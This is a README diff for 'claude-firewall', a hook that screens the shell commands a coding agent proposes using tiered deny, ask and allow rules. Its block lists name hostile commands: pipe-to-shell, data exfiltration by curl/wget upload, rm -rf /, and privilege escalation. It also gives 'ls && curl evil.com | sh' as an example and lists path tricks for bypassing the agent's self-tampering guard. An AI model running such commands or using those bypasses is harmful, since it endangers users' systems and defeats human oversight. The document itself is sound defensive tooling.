@@ -16,24 +16,27 @@ claude-firewall adds that layer — a tiered policy engine that auto-approves sa
 
 ## How it works
 
-claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts every Bash command before execution and routes it through a three-tier policy:
+claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts every Bash command before execution and routes it through a tiered policy. Requires `jq`.
 
 **Tier 1 — DENY:** Hard-blocks catastrophic patterns. No override, no prompt. Includes:
-- Shell injection (`curl | sh`, `eval`, pipe-to-shell)
+- Shell injection (`curl | sh`, `| /bin/bash`, `eval`, pipe-to-shell — bare and full-path variants)
+- Shell execution of files (`sh /tmp/x.sh`, `/bin/bash ./script.sh`, `exec ./x`, `source ./x`, `. ./x`)
+- Shell `-c` execution (`sh -c "..."`, `bash -c "..."`, `/usr/bin/bash -c "..."`)
 - Privilege escalation (`sudo`, `doas`, `pkexec`, `su`, `run0`)
 - Destructive git (`push --force`, `reset --hard`, `clean -f`)
 - System destruction (`mkfs`, `dd`, `chmod 777`, `chmod -R`)
-- Data exfiltration (curl/wget file uploads)
+- Data exfiltration (curl/wget file uploads: `-d @`, `--data=@`, `--upload-file`, `--post-file`)
 - Destructive GitHub ops (`gh repo delete`)
-- `rm -rf` at dangerous scopes (`/`, `~`, `..`, `.`)
-- Shell execution of downloaded files (`sh /tmp/x.sh`, `bash ./script.sh`)
-- Self-tampering (writes to `~/.claude/hooks/`, `~/.claude/settings.json`, `~/.claude/rules/`)
+- `rm -rf` at dangerous scopes (`/`, `/*`, `~`, `~/`, `~/*`, `..`, `.`)
+- Self-tampering (writes to `~/.claude/hooks/`, `~/.claude/settings.json`, `~/.claude/rules/` — with path normalization to defeat `//`, `/../`, and `$HOME` bypass tricks)
 
 **Tier 1c — AUTO-REJECT:** Commands that are wrong but reformattable. The hook rejects with instructions and Claude retries correctly — no human in the loop. Example: `git commit -m "$(cat <<EOF...)"` → auto-rejected with guidance to use `printf '...' | git commit -F -`.
 
 **Tier 1d — SUBSHELL GUARD:** Commands containing `$()`, backticks, or process substitutions are forced to ASK tier. They're not auto-approved (could hide arbitrary operations) but not denied (might be legitimate).
 
-**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.
+**Tier 1e — SENSITIVE DOTFILE GUARD:** Writes to sensitive user dotfiles (`~/.ssh/`, `~/.gnupg/`, `~/.bashrc`, `~/.zshrc`, `~/.env`, etc.) are forced to ASK. Legitimate but worth human review.
+
+**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;`, `&` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.
 
 **Tier 3 — ASK:** Everything else falls through to Claude Code's normal permission prompt. Every ASK-tier hit is logged to `~/.claude/hooks/firewall-ask.log` (TSV: timestamp, tier, command) so you can review and promote patterns over time.
 
